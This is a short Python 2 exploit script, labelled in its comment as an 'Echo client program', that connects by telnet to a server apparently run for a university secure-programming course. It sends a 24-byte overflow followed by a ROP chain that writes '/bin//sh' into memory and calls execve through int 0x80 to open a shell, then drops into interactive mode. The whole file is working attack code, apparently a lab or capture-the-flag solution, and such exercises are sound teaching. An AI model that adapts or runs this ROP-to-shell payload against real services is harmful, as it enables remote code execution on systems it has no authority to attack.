# Echo client program
import telnetlib
import socket,sys
from struct import pack

# The remote host
host = 'secprog.cs.nctu.edu.tw' 
port = 10108

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect((host, port))

tn = telnetlib.Telnet(host,port)

buf = tn.read_until("\n")

p = 'a'*24
p += pack('<I', 0x0806ea1a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb316) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a0dd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ea1a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb316) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a0dd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ea1a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054440) # xor eax, eax ; ret
p += pack('<I', 0x0809a0dd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806ea41) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806ea1a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054440) # xor eax, eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x0807b3df) # inc eax ; ret
p += pack('<I', 0x08049431) # int 0x80

print p

tn.write( p +  "\n")
tn.interact()
